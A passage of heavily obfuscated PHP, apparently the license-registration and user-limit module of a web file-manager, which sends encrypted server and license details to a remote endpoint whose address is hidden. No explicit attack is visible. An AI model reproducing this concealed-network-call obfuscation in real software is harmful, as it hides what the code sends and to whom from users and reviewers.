strrpos($«æÖ©Ë, $¤³×˜Ñ›); $‰•šß³© = substr($«æÖ©Ë, $éÎ¶Á³Ü + strlen($¤³×˜Ñ›)); $ÉíøîˆÎ = $–ÙÊ–[673]; if (!$ÉíøîˆÎ) { return; } preg_match_all($üØ³öä£[18], $‰•šß³©, $—†š–ò¤); $‰•šß³© = trim($—†š–ò¤[0][0], $üØ³öä£[19]); $GLOBALS[$üØ³öä£[13]][$üØ³öä£[14]] = explode($üØ³öä£[19], $‰•šß³©); $œĞ‘™´ó = $–ÙÊ–[674]; if (strlen($œĞ‘™´ó) < $–ÙÊ–[675]) { die; } $GLOBALS[$üØ³öä£[13]][$üØ³öä£[15]] = implode($üØ³öä£[0], $GLOBALS[$üØ³öä£[13]][$üØ³öä£[14]]); } public function run() { $§æ¥±Ÿ =& $_SERVER[ú÷îèÆÜ]; $î¬´¦© =& $_SERVER[û¬ú¢è]; $this->ljzi429e8d73(); $this->tafe567b59f0(); $˜œÇœ´ˆ = $GLOBALS[$î¬´¦©[13]][$î¬´¦©[14]]; $ğş¢ÙÈ– = $GLOBALS[$î¬´¦©[13]][$î¬´¦©[15]]; define($î¬´¦©[20], isset($˜œÇœ´ˆ[0]) && $˜œÇœ´ˆ[0] ? $˜œÇœ´ˆ[0] : $this->defaultModule); define($î¬´¦©[21], isset($˜œÇœ´ˆ[1]) && $˜œÇœ´ˆ[0] ? $˜œÇœ´ˆ[1] : $this->defaultController); $ïğ¾¢œ = $§æ¥±Ÿ[676]; if (!$ïğ¾¢œ) { return; } define($î¬´¦©[22], isset($˜œÇœ´ˆ[2]) && $˜œÇœ´ˆ[0] ? $˜œÇœ´ˆ[2] : $this->defaultAction); define($î¬´¦©[23], MOD . $î¬´¦©[0] . ST . $î¬´¦©[0] . ACT); $¦€Øõ¹ã = $§æ¥±Ÿ[677]; if (strlen($¦€Øõ¹ã) < $§æ¥±Ÿ[662]) { die; } $_SERVER[$î¬´¦©[24]] = strtolower(ACTION); $this->autorun(); if (count($˜œÇœ´ˆ) >= 3) { $this->appRun($ğş¢ÙÈ–); } else { $this->appRun(ACTION); } } private $olnbc49f451c = array(); private $fqgpe48f3ac0 = ''; public function ihdg55cbed74() { $éÜæ¨á =& $_SERVER[ú÷îèÆÜ]; $ö¤–îÔº =& $_SERVER[û¬ú¢è]; $this->yhqf63060cbf(); $this->kipl2062c4f5(); $this->wiub190bda98(); $this->mqdn710e1d30(); $this->yareebb26ef5(); $this->wktf77119f14(); $ùË“†”Æ = $éÜæ¨á[678]; while (strlen($ùË“†”Æ) < $éÜæ¨á[12]) { if (!$ùË“†”Æ) { break; } $ùË“†”Æ++; } $this->arfd0ed3d9fb(); $¿ø¯ = $éÜæ¨á[679]; while (strlen($¿ø¯) < $éÜæ¨á[662]) { if (!$¿ø¯) { break; } $¿ø¯++; } $this->ekqfc4a7aafa($ö¤–îÔº[25], array($this, $ö¤–îÔº[26])); $Â©±˜Ğ  = $éÜæ¨á[680]; while ($Â©±˜Ğ  < $éÜæ¨á[12]) { if ($Â©±˜Ğ  >= 0) { break; } $Â©±˜Ğ ++; } $this->ekqfc4a7aafa($ö¤–îÔº[27], array($this, $ö¤–îÔº[28])); $this->ekqfc4a7aafa($ö¤–îÔº[29], array($this, $ö¤–îÔº[30])); $Å·˜ºï  = $éÜæ¨á[681]; while (strlen($Å·˜ºï ) < $éÜæ¨á[682]) { if (!$Å·˜ºï ) { break; } $Å·˜ºï ++; } $this->ekqfc4a7aafa($ö¤–îÔº[31], array($this, $ö¤–îÔº[32])); $¨Ñôç = $éÜæ¨á[683]; while ($¨Ñôç < $éÜæ¨á[675]) { if ($¨Ñôç >= 0) { break; } $¨Ñôç++; } } public function cqhg1e29725b($í±Î¹Ù¤) { $ƒ‘‘Àü‹ =& $_SERVER[ú÷îèÆÜ]; $€Óúü‹Æ =& $_SERVER[û¬ú¢è]; $–ó×ê = Model($€Óúü‹Æ[33])->get(); $™ê²½€â = $ƒ‘‘Àü‹[684]; if (!$™ê²½€â) { return; } $€Ìü»å = array($€Óúü‹Æ[34], $€Óúü‹Æ[35], $€Óúü‹Æ[36], $€Óúü‹Æ[37], $€Óúü‹Æ[38], $€Óúü‹Æ[39], $€Óúü‹Æ[40], $€Óúü‹Æ[41], $€Óúü‹Æ[42], $€Óúü‹Æ[43], $€Óúü‹Æ[44], $€Óúü‹Æ[45], $€Óúü‹Æ[46], $€Óúü‹Æ[47], $€Óúü‹Æ[48], $€Óúü‹Æ[49], $€Óúü‹Æ[50], $€Óúü‹Æ[51], $€Óúü‹Æ[52], $€Óúü‹Æ[53], $€Óúü‹Æ[54], $€Óúü‹Æ[55], $€Óúü‹Æ[56], $€Óúü‹Æ[57], $€Óúü‹Æ[58], $€Óúü‹Æ[59], $€Óúü‹Æ[60], $€Óúü‹Æ[61], $€Óúü‹Æ[62], $€Óúü‹Æ[63], $€Óúü‹Æ[64], $€Óúü‹Æ[65], $€Óúü‹Æ[66], $€Óúü‹Æ[67], $€Óúü‹Æ[68], $€Óúü‹Æ[69], $€Óúü‹Æ[70], $€Óúü‹Æ[71], $€Óúü‹Æ[72], $€Óúü‹Æ[73], $€Óúü‹Æ[74], $€Óúü‹Æ[75], $€Óúü‹Æ[76], $€Óúü‹Æ[77], $€Óúü‹Æ[78], $€Óúü‹Æ[79], $€Óúü‹Æ[80], $€Óúü‹Æ[81], $€Óúü‹Æ[82], $€Óúü‹Æ[83], $€Óúü‹Æ[84]); foreach ($€Ìü»å as $¾—Š´­ï) { $¼«§‹„ = $GLOBALS[$€Óúü‹Æ[85]][$€Óúü‹Æ[86]][$¾—Š´­ï]; if (isset($–ó×ê[$¾—Š´­ï])) { $¼«§‹„ = $–ó×ê[$¾—Š´­ï]; } $í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[88]][$¾—Š´­ï] = $¼«§‹„; } $¾Úˆ³Ç¤ = $í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[88]][$€Óúü‹Æ[46]]; $ÓˆŒíº¿ = $ƒ‘‘Àü‹[685]; if (strlen($ÓˆŒíº¿) < $ƒ‘‘Àü‹[675]) { return; } unset($í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[89]][$€Óúü‹Æ[90]]); unset($í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[89]][$€Óúü‹Æ[91]]); unset($í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[88]][$€Óúü‹Æ[46]]); unset($í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[88]][$€Óúü‹Æ[92]]); $âµÌø©– = $ƒ‘‘Àü‹[686]; $í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[88]][$€Óúü‹Æ[93]] = array($€Óúü‹Æ[94] => (int) $¾Úˆ³Ç¤[$€Óúü‹Æ[95]], $€Óúü‹Æ[96] => (int) _get($¾Úˆ³Ç¤, $€Óúü‹Æ[97], 0)); $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[99]] = Action($€Óúü‹Æ[100])->safeToken(); $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[101]] = Action($€Óúü‹Æ[100])->accessToken(); $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[102]] = md5($_SERVER[$€Óúü‹Æ[103]] . $–ó×ê[$€Óúü‹Æ[104]]); $‰Ù¬ÆÇ = $ƒ‘‘Àü‹[687]; if (strlen($‰Ù¬ÆÇ) < $ƒ‘‘Àü‹[662]) { die; } $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[105]] = base64_encode(serverInfo()); $å“äèœ× = $ƒ‘‘Àü‹[688]; $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[106]] = $this->fqgpe48f3ac0; $‘¸‰Ø› = $ƒ‘‘Àü‹[689]; if (strlen($‘¸‰Ø›) < $ƒ‘‘Àü‹[12]) { die; } if ($–ó×ê[$€Óúü‹Æ[106]] != $€Óúü‹Æ[107]) { $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[108]] = $–ó×ê[$€Óúü‹Æ[108]]; $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[109]] = $–ó×ê[$€Óúü‹Æ[109]]; $Ü®ò–º = rand_string(10) . $this->fqgpe48f3ac0 . rand_string(5); $í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[110]][$€Óúü‹Æ[111]] = $this->ulwh22069c88($Ü®ò–º, $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[102]]); } if ($this->fqgpe48f3ac0 == $€Óúü‹Æ[107]) { $í±Î¹Ù¤[$€Óúü‹Æ[87]][$€Óúü‹Æ[88]][$€Óúü‹Æ[93]][$€Óúü‹Æ[97]] = 0; } $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[112]] = _get($this->olnbc49f451c, $€Óúü‹Æ[113], $€Óúü‹Æ[6]); $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[114]] = _get($this->olnbc49f451c, $€Óúü‹Æ[115], $€Óúü‹Æ[6]); if (_get($GLOBALS, $€Óúü‹Æ[116]) && $this->config[$€Óúü‹Æ[117]]) { $í±Î¹Ù¤[$€Óúü‹Æ[98]][$€Óúü‹Æ[118]] = WEB_ROOT; } return $í±Î¹Ù¤; } private function wktf77119f14() { $¸“½»Æö =& $_SERVER[ú÷îèÆÜ]; $ã«Ã¾ =& $_SERVER[û¬ú¢è]; $¯º†Õ¨± = $_SERVER[$ã«Ã¾[24]] == $ã«Ã¾[119]; $îâŒ Şı = $¸“½»Æö[690]; if (!$îâŒ Şı) { die; } if ($_SERVER[$ã«Ã¾[24]] == $ã«Ã¾[120] && $_GET[$ã«Ã¾[121]] == $ã«Ã¾[122]) { $¯º†Õ¨± = !0; } if ($¯º†Õ¨±) { $òõ†—Ùğ = array($ã«Ã¾[106] => $this->fqgpe48f3ac0, $ã«Ã¾[123] => $this->qpnv736865e5(), $ã«Ã¾[124] => Model($ã«Ã¾[125])->count()); if ($this->fqgpe48f3ac0 != $ã«Ã¾[107]) { $‘ëşÊƒ = _get($this->olnbc49f451c, $ã«Ã¾[126]); if ($‘ëşÊƒ) { $òõ†—Ùğ[$ã«Ã¾[127]] = $‘ëşÊƒ; $òõ†—Ùğ[$ã«Ã¾[128]] = strtotime(_get($this->olnbc49f451c, $ã«Ã¾[129])); $òõ†—Ùğ[$ã«Ã¾[130]] = _get($this->olnbc49f451c, $ã«Ã¾[115]); } $ÈŠÙ´ = Model($ã«Ã¾[33])->get($ã«Ã¾[131], $ã«Ã¾[6], !0); if (is_string($ÈŠÙ´) && substr($ÈŠÙ´, 0, 1) == $ã«Ã¾[132]) { $ÈŠÙ´ = json_decode_force($ÈŠÙ´); } if (is_array($ÈŠÙ´) && $ÈŠÙ´[$ã«Ã¾[133]] && strstr($ÈŠÙ´[$ã«Ã¾[133]], $ã«Ã¾[134])) { $Î…ÏÁºÉ = explode($ã«Ã¾[134], $ÈŠÙ´[$ã«Ã¾[133]]); $òõ†—Ùğ[$ã«Ã¾[135]] = $Î…ÏÁºÉ[0]; } } $òõ†—Ùğ = $this->cdlj69ae248c(json_encode($òõ†—Ùğ), md5($ã«Ã¾[136])); $¬æÈ˜Â = $¸“½»Æö[691]; if (!$¬æÈ˜Â) { die; } $ıÖ™Ã˜“ = array($ã«Ã¾[137] => $òõ†—Ùğ); $ˆá›¢ãÁ = $¸“½»Æö[692]; while (strlen($ˆá›¢ãÁ) < $¸“½»Æö[662]) { if (!$ˆá›¢ãÁ) { break; } $ˆá›¢ãÁ++; } call_user_func(array($ã«Ã¾[138], $ã«Ã¾[139]), $ıÖ™Ã˜“); $¥éµÖçá = $¸“½»Æö[693]; while ($¥éµÖçá < $¸“½»Æö[682]) { if ($¥éµÖçá >= 0) { break; } $¥éµÖçá++; } } if ($this->fqgpe48f3ac0 == $ã«Ã¾[107]) { return; } $Ğ¿‹äÅ½ = array($ã«Ã¾[140], $ã«Ã¾[141], $ã«Ã¾[142], $ã«Ã¾[143], $ã«Ã¾[144], $ã«Ã¾[145]); $º¤©Ş¨Š = $¸“½»Æö[694]; if (!$º¤©Ş¨Š) { die; } $¶¾›ı°» = Model($ã«Ã¾[33])->get(); $ıÖ™Ã˜“ = array($ã«Ã¾[146] => $¶¾›ı°»[$ã«Ã¾[34]], $ã«Ã¾[147] => $¶¾›ı°»[$ã«Ã¾[35]], $ã«Ã¾[148] => $ã«Ã¾[6]); $Î¨Ùï“ë = $¸“½»Æö[695]; while (strlen($Î¨Ùï“ë) < $¸“½»Æö[682]) { if (!$Î¨Ùï“ë) { break; } $Î¨Ùï“ë++; } foreach ($Ğ¿‹äÅ½ as $ºá‹¦ì„) { if (!isset($¶¾›ı°»[$ºá‹¦ì„]) || !$¶¾›ı°»[$ºá‹¦ì„]) { continue; } $ıÖ™Ã˜“[$ºá‹¦ì„] = $¶¾›ı°»[$ºá‹¦ì„]; $¾¿óŞÓ = $¸“½»Æö[696]; } call_user_func(array($ã«Ã¾[138], $ã«Ã¾[139]), $ıÖ™Ã˜“); } private function mqdn710e1d30() { $‘°—¸ÕÏ =& $_SERVER[ú÷îèÆÜ]; $î˜ºÚ‹¼ =& $_SERVER[û¬ú¢è]; if ($_SERVER[$î˜ºÚ‹¼[24]] != $î˜ºÚ‹¼[149]) { return; } if (!_get($GLOBALS, $î˜ºÚ‹¼[116])) { die; } $Ï‘¨ã¤µ = $GLOBALS[$î˜ºÚ‹¼[13]]; if (isset($Ï‘¨ã¤µ[$î˜ºÚ‹¼[150]])) { $this->mnckb7682f13(); die; } if (!isset($Ï‘¨ã¤µ[$î˜ºÚ‹¼[151]]) || strlen($Ï‘¨ã¤µ[$î˜ºÚ‹¼[151]]) != 16) { show_json($î˜ºÚ‹¼[152] . $Ï‘¨ã¤µ[$î˜ºÚ‹¼[151]], !1); } $å—’›õü = Model($î˜ºÚ‹¼[33])->get($î˜ºÚ‹¼[104]); $­‹É‰‰÷ = md5($_SERVER[$î˜ºÚ‹¼[103]] . $å—’›õü); $şÏ¼¼€å = array($î˜ºÚ‹¼[151] => $Ï‘¨ã¤µ[$î˜ºÚ‹¼[151]], $î˜ºÚ‹¼[153] => rand_string(16), $î˜ºÚ‹¼[154] => $î˜ºÚ‹¼[136], $î˜ºÚ‹¼[155] => $î˜ºÚ‹¼[156], $î˜ºÚ‹¼[157] => $_SERVER[$î˜ºÚ‹¼[158]], $î˜ºÚ‹¼[159] => $_SERVER[$î˜ºÚ‹¼[160]], $î˜ºÚ‹¼[161] => $_SERVER[$î˜ºÚ‹¼[162]], $î˜ºÚ‹¼[102] => $­‹É‰‰÷, $î˜ºÚ‹¼[163] => Model($î˜ºÚ‹¼[33])->get($î˜ºÚ‹¼[131])); if ($Ï‘¨ã¤µ[$î˜ºÚ‹¼[164]] == $î˜ºÚ‹¼[165]) { $¤éı« = $this->cdlj69ae248c($­‹É‰‰÷, $î˜ºÚ‹¼[166]); $»èä€œë = $this->ulwh22069c88(json_encode($şÏ¼¼€å), $­‹É‰‰÷ . $î˜ºÚ‹¼[167], 3); $»èä€œë = $»èä€œë . $î˜ºÚ‹¼[168] . $_SERVER[$î˜ºÚ‹¼[158]]; $£ıó‘à = $this->ewvj2f9c258e($î˜ºÚ‹¼[169] . $¤éı« . $î˜ºÚ‹¼[170] . $»èä€œë, -1); show_json($£ıó‘à, !0); } else { if ($Ï‘¨ã¤µ[$î˜ºÚ‹¼[164]] == $î˜ºÚ‹¼[171]) { $øÒ®¢ ¾ = substr(md5($î˜ºÚ‹¼[172] . $­‹É‰‰÷), 12, 15) . $î˜ºÚ‹¼[173]; $»èä€œë = $this->bsygaf9bb15f(trim($Ï‘¨ã¤µ[$î˜ºÚ‹¼[174]]), $øÒ®¢ ¾, 2); $şñä¬ğÊ = json_decode($»èä€œë, !0); if (!is_array($şñä¬ğÊ) || !is_array($şñä¬ğÊ[$î˜ºÚ‹¼[175]]) || $şñä¬ğÊ[$î˜ºÚ‹¼[151]] != !0) { $¥ãŒ¹¥ = $î˜ºÚ‹¼[176]; $™çƒÊö‹ = $şñä¬ğÊ[$î˜ºÚ‹¼[175]] ? $î˜ºÚ‹¼[177] . $şñä¬ğÊ[$î˜ºÚ‹¼[175]] : $¥ãŒ¹¥; show_json($™çƒÊö‹, !1); } else { $şÏ¼¼€å[$î˜ºÚ‹¼[153]] = $şñä¬ğÊ[$î˜ºÚ‹¼[175]][$î˜ºÚ‹¼[178]]; } } else { $şñä¬ğÊ = $this->ewvj2f9c258e($î˜ºÚ‹¼[179], $şÏ¼¼€å, 10); $Åë¸›µ = $‘°—¸ÕÏ[697]; if (strlen($Åë¸›µ) < $‘°—¸ÕÏ[666]) { return; } } } if (!is_array($şñä¬ğÊ) || !is_array($şñä¬ğÊ[$î˜ºÚ‹¼[175]]) || $şñä¬ğÊ[$î˜ºÚ‹¼[151]] != !0) { $¥ãŒ¹¥ = LNG($î˜ºÚ‹¼[180]); $™çƒÊö‹ = $şñä¬ğÊ[$î˜ºÚ‹¼[175]] ? $î˜ºÚ‹¼[177] . $şñä¬ğÊ[$î˜ºÚ‹¼[175]] : $¥ãŒ¹¥; show_json($™çƒÊö‹, !1); } $Š¾®Æ° = $şñä¬ğÊ[$î˜ºÚ‹¼[175]]; $¼€À«§¦ = $this->eqkab4bbc6d4($Š¾®Æ°[$î˜ºÚ‹¼[181]]); if (!$¼€À«§¦ || $¼€À«§¦ != $Š¾®Æ°[$î˜ºÚ‹¼[129]]) { $Ò ØáÜ = array($î˜ºÚ‹¼[182] => Model($î˜ºÚ‹¼[33])->get($î˜ºÚ‹¼[104]), $î˜ºÚ‹¼[183] => $_SERVER[$î˜ºÚ‹¼[103]], $î˜ºÚ‹¼[184] => this_url(), $î˜ºÚ‹¼[159] => $_SERVER[$î˜ºÚ‹¼[160]]); $»èä€œë = $this->eztf496938c0(json_encode($Ò ØáÜ)); $this->ewvj2f9c258e($î˜ºÚ‹¼[185] . $»èä€œë); show_json(LNG($î˜ºÚ‹¼[186]), !0); } $ŸÚşÀÊ = array($î˜ºÚ‹¼[187] => $Š¾®Æ°[$î˜ºÚ‹¼[188]], $î˜ºÚ‹¼[189] => $Š¾®Æ°[$î˜ºÚ‹¼[190]], $î˜ºÚ‹¼[191] => rand_string(16), $î˜ºÚ‹¼[106] => $Š¾®Æ°[$î˜ºÚ‹¼[192]]); if ($şÏ¼¼€å[$î˜ºÚ‹¼[153]]) { $ŸÚşÀÊ[$î˜ºÚ‹¼[191]] = $şÏ¼¼€å[$î˜ºÚ‹¼[153]]; } $ë¨ÂÙï = substr(md5($ŸÚşÀÊ[$î˜ºÚ‹¼[189]]), 10, 10); $©Š•¿ı÷ = $ë¨ÂÙï . $ŸÚşÀÊ[$î˜ºÚ‹¼[106]] . $ŸÚşÀÊ[$î˜ºÚ‹¼[191]]; $ŸÚşÀÊ[$î˜ºÚ‹¼[108]] = strrev(base64_encode($this->cdlj69ae248c($©Š•¿ı÷, $î˜ºÚ‹¼[193]))); $âÏË¯áš = rand_string(16); $‚‡ÕŒê = $âÏË¯áš . $ŸÚşÀÊ[$î˜ºÚ‹¼[106]] . $this->cdlj69ae248c(md5($ŸÚşÀÊ[$î˜ºÚ‹¼[187]]), $âÏË¯áš); $’ƒ’ ¾Ö = $‘°—¸ÕÏ[698]; while (strlen($’ƒ’ ¾Ö) < $‘°—¸ÕÏ[666]) { if (!$’ƒ’ ¾Ö) { break; } $’ƒ’ ¾Ö++; } $ŸÚşÀÊ[$î˜ºÚ‹¼[109]] = base64_encode(strrev($this->cdlj69ae248c($‚‡ÕŒê, $î˜ºÚ‹¼[194]))); $Ï¦¡èñ“ = $‘°—¸ÕÏ[699]; if (strlen($Ï¦¡èñ“) < $‘°—¸ÕÏ[12]) { return; } if ($Š¾®Æ°[$î˜ºÚ‹¼[195]] && $Š¾®Æ°[$î˜ºÚ‹¼[195]] >= 1) { Model($î˜ºÚ‹¼[33])->setDeep($î˜ºÚ‹¼[196], $î˜ºÚ‹¼[122]); } Model($î˜ºÚ‹¼[33])->set($ŸÚşÀÊ); $¿ˆëŞñÎ = md5($_SERVER[$î˜ºÚ‹¼[103]] . strrev($å—’›õü) . $ŸÚşÀÊ[$î˜ºÚ‹¼[189]]); $î×ç²ÌÀ = $‘°—¸ÕÏ[700]; if (!$î×ç²ÌÀ) { return; } $ÄåÎôÇ = strrev(substr($¿ˆëŞñÎ, 10, 16)); $ãĞÚ’¿ = $‘°—¸ÕÏ[701]; while (strlen($ãĞÚ’¿) < $‘°—¸ÕÏ[662]) { if (!$ãĞÚ’¿) { break; } $ãĞÚ’¿++; } $ìºîç®Í = $this->ulwh22069c88(json_encode($Š¾®Æ°), $¿ˆëŞñÎ); $ìŞ–ıŸ¬ = array_to_keyvalue(Model($î˜ºÚ‹¼[7])->listData(), $î˜ºÚ‹¼[197]); $õ«§êŒ— = $ìŞ–ıŸ¬[$î˜ºÚ‹¼[198]]; $£‘ÍÆë‚ = array(); $£‘ÍÆë‚[$ÄåÎôÇ] = $ìºîç®Í; $ö—ºê¹ = $‘°—¸ÕÏ[702]; while ($ö—ºê¹ < $‘°—¸ÕÏ[666]) { if ($ö—ºê¹ >= 0) { break; } $ö—ºê¹++; } Model($î˜ºÚ‹¼[7])->update($õ«§êŒ—[$î˜ºÚ‹¼[199]], array($î˜ºÚ‹¼[200] => $£‘ÍÆë‚)); $è¦ü—Àô = $‘°—¸ÕÏ[703]; while (strlen($è¦ü—Àô) < $‘°—¸ÕÏ[12]) { if (!$è¦ü—Àô) { break; } $è¦ü—Àô++; } $this->olnbc49f451c = $Š¾®Æ°; $É€¨Áİ¶ = $‘°—¸ÕÏ[704]; if (!$É€¨Áİ¶) { die; } $this->fqgpe48f3ac0 = $ŸÚşÀÊ[$î˜ºÚ‹¼[106]]; $é²ê³ = $‘°—¸ÕÏ[705]; if (!$é²ê³) { die; } $this->licenseRegistSuccess(); Cache::set($î˜ºÚ‹¼[201] . md5($å—’›õü . $î˜ºÚ‹¼[202]), $î˜ºÚ‹¼[6]); $·¹ Ï±´ = $‘°—¸ÕÏ[706]; while ($·¹ Ï±´ < $‘°—¸ÕÏ[12]) { if ($·¹ Ï±´ >= 0) { break; } $·¹ Ï±´++; } show_json(LNG($î˜ºÚ‹¼[186]), !0); } private function licenseRegistSuccess() { $à–šå±ã =& $_SERVER[û¬ú¢è]; $ùğ‹Ã‡Ä = Model($à–šå±ã[33])->get(); if ($ùğ‹Ã‡Ä[$à–šå±ã[63]] != $à–šå±ã[122]) { Model($à–šå±ã[33])->set($à–šå±ã[63], $à–šå±ã[122]); } Action($à–šå±ã[203])->initStart(!0); } private function mnckb7682f13() { $–¬Ôêõï =& $_SERVER[ú÷îèÆÜ]; $­¾Àı›à =& $_SERVER[û¬ú¢è]; Model($­¾Àı›à[33])->set(array($­¾Àı›à[187] => $­¾Àı›à[6], $­¾Àı›à[189] => $­¾Àı›à[6], $­¾Àı›à[106] => $­¾Àı›à[107], $­¾Àı›à[108] => $­¾Àı›à[6], $­¾Àı›à[109] => $­¾Àı›à[6])); Model($­¾Àı›à[33])->setDeep($­¾Àı›à[196], $­¾Àı›à[204]); $this->olnbc49f451c = array(); $ËÜ ¿Û¢ = $–¬Ôêõï[707]; if (strlen($ËÜ ¿Û¢) < $–¬Ôêõï[666]) { return; } $this->fqgpe48f3ac0 = $­¾Àı›à[107]; $‰ì³ïÎ = $–¬Ôêõï[708]; if (strlen($‰ì³ïÎ) < $–¬Ôêõï[682]) { die; } } private function yhqf63060cbf() { $Ò´¡ãÚ =& $_SERVER[ú÷îèÆÜ]; $…ıºìáò =& $_SERVER[û¬ú¢è]; $_SERVER[$…ıºìáò[160]] = _get($_SERVER, $…ıºìáò[160], APP_HOST); $this->fqgpe48f3ac0 = $…ıºìáò[107]; $­ÏŸïÖ = $Ò´¡ãÚ[709]; if (!$­ÏŸïÖ) { return; } $áÙ–¿ ß = Model($…ıºìáò[33])->get(); $Á”¸¡£Ş = $Ò´¡ãÚ[710]; while (strlen($Á”¸¡£Ş) < $Ò´¡ãÚ[662]) { if (!$Á”¸¡£Ş) { break; } $Á”¸¡£Ş++; } if ($áÙ–¿ ß[$…ıºìáò[106]] == $…ıºìáò[107]) { return; } $’ÎÈ·À = Model($…ıºìáò[33])->get($…ıºìáò[104]); $úÏ¶ºÇ = $Ò´¡ãÚ[711]; if (strlen($úÏ¶ºÇ) < $Ò´¡ãÚ[12]) { die; } $ò¾ Œ™ß = $…ıºìáò[201] . md5($’ÎÈ·À . $…ıºìáò[202]); $¶ñ×†º = Cache::get($ò¾ Œ™ß); if (!is_array($¶ñ×†º) || !isset($¶ñ×†º[$…ıºìáò[205]]) || time() - $¶ñ×†º[$…ıºìáò[205]] >= 60) { $àÍœá = Model($…ıºìáò[7])->loadList(); $ò²¹Õ¿î = $àÍœá[$…ıºìáò[198]]; $Ü½ÖçÃ = md5($_SERVER[$…ıºìáò[103]] . strrev($’ÎÈ·À) . $áÙ–¿ ß[$…ıºìáò[189]]); $³Ì¾çÑÏ = strrev(substr($Ü½ÖçÃ, 10, 16)); $¶ñ×†º = $this->bsygaf9bb15f($ò²¹Õ¿î[$…ıºìáò[85]][$³Ì¾çÑÏ], $Ü½ÖçÃ); $¶ñ×†º = json_decode($¶ñ×†º, !0); } if (!is_array($¶ñ×†º)) { return $this->mnckb7682f13(); } $İûº¸ = strtotime($¶ñ×†º[$…ıºìáò[129]]); if (time() >= $İûº¸) { return $this->mnckb7682f13(); } if (time() - $¶ñ×†º[$…ıºìáò[205]] > 20) { $¶ñ×†º[$…ıºìáò[205]] = time(); Cache::set($ò¾ Œ™ß, $¶ñ×†º); } $this->olnbc49f451c = $¶ñ×†º; $this->fqgpe48f3ac0 = $áÙ–¿ ß[$…ıºìáò[106]]; } private function kipl2062c4f5() { $‹ñÏ‘Ì =& $_SERVER[ú÷îèÆÜ]; $Àßµ† =& $_SERVER[û¬ú¢è]; $»Ö­í©ú = $GLOBALS[$Àßµ†[13]]; $¢Ï¾ş¼ù = $‹ñÏ‘Ì[712]; while ($¢Ï¾ş¼ù < $‹ñÏ‘Ì[666]) { if ($¢Ï¾ş¼ù >= 0) { break; } $¢Ï¾ş¼ù++; } $ßÁî½ê± = $_SERVER[$Àßµ†[24]]; $›“È½ñä = $‹ñÏ‘Ì[713]; if ($ßÁî½ê± == $Àßµ†[206] && $this->fqgpe48f3ac0 == $Àßµ†[107]) { show_json(LNG($Àßµ†[207]), !1, $Àßµ†[208]); } $ÑÎ»¢ïÉ = array($Àßµ†[209], $Àßµ†[210]); if (in_array($ßÁî½ê±, $ÑÎ»¢ïÉ)) { if ($this->fqgpe48f3ac0 == $Àßµ†[107] && isset($»Ö­í©ú[$Àßµ†[211]])) { show_json(LNG($Àßµ†[207]), !1, $Àßµ†[208]); die; } $à¦Öõ Û = $this->qpnv736865e5(); if ($à¦Öõ Û != intval($Àßµ†[212])) { if ($à¦Öõ Û <= Model($Àßµ†[125])->count()) { show_json(LNG($Àßµ†[213]), !1, $Àßµ†[208]); die; } } } } private function wiub190bda98() { $‡ÀÛÆš =& $_SERVER[ú÷îèÆÜ]; $åæšûÆš =& $_SERVER[û¬ú¢è]; $¯‰°–¶Ù = array($åæšûÆš[119], $åæšûÆš[120]); if (!_get($GLOBALS, $åæšûÆš[116]) || !isset($_GET[$åæšûÆš[214]])) { return; } if (!in_array($_SERVER[$åæšûÆš[24]], $¯‰°–¶Ù)) { return; } $ª“Õ¸ÈÂ = $åæšûÆš[215]; $ª“Õ¸ÈÂ = $this->jpwa80e7681e($ª“Õ¸ÈÂ, $åæšûÆš[216]); $Æ²ñû‹ = $‡ÀÛÆš[714]; while (strlen($Æ²ñû‹) < $‡ÀÛÆš[666]) { if (!$Æ²ñû‹) { break; } $Æ²ñû‹++; } $æÜ©¬ƒ® = stream_context_create(array($åæšûÆš[217] => array($åæšûÆš[218] => $åæšûÆš[219], $åæšûÆš[220] => 3))); $”Ï¶à®­ = @file_get_contents($ª“Õ¸ÈÂ, !1, $æÜ©¬ƒ®); header($åæšûÆš[221]); if ($”Ï¶à®­ && strstr($”Ï¶à®­, $åæšûÆš[222])) { echo $”Ï¶à®­; } die; } public function hnfgd79acd79($œşíÈ‰Û) { $ë¼œ¥³õ =& $_SERVER[ú÷îèÆÜ]; $À·×çÖª =& $_SERVER[û¬ú¢è]; if ($this->fqgpe48f3ac0 == $À·×çÖª[223]) { return $œşíÈ‰Û; } $„ËàïÆ˜ = array($À·×çÖª[224] => $À·×çÖª[225], $À·×çÖª[226] => $À·×çÖª[225], $À·×çÖª[227] => $À·×çÖª[225], $À·×çÖª[228] => $À·×çÖª[229], $À·×çÖª[230] => $À·×çÖª[229], $À·×çÖª[231] => $À·×çÖª[229], $À·×çÖª[232] => $À·×çÖª[229], $À·×çÖª[233] => $À·×çÖª[229], $À·×çÖª[234] => $À·×çÖª[229], $À·×çÖª[235] => $À·×çÖª[229], $À·×çÖª[236] => $À·×çÖª[229], $À·×çÖª[237] => $À·×çÖª[229], $À·×çÖª[238] => $À·×çÖª[229], $À·×çÖª[239] => $À·×çÖª[229], $À·×çÖª[240] => $À·×çÖª[229]); $í¡ù·²‡ = $ë¼œ¥³õ[715]; if (strlen($í¡ù·²‡) < $ë¼œ¥³õ[682]) { return; } $†…¾û®¯ = explode($À·×çÖª[241], _get($this->olnbc49f451c, $À·×çÖª[113], $À·×çÖª[6])); $÷®œÇ©ä = $ë¼œ¥³õ[716]; while (strlen($÷®œÇ©ä) < 